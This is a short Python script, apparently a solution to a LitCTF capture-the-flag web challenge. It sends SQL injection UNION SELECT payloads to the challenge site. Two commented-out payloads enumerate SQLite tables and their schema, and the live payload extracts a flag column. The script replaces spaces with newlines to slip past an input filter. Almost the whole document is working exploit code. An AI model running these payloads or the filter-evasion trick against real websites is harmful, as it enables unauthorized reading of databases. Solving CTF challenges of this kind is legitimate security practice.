import requests
#payload = "' union SELECT tbl_name FROM sqlite_master WHERE type like 'table"
#payload = "' union SELECT sql FROM sqlite_master WHERE name like 'flag_is"
payload = "' union select flag_column from flag_is_in_here where '1' like '1"
resp = requests.get(
	"https://alex-fan-club.litctf.live/", params={"param": payload.replace(" ", "\n")}
)
print(resp.text)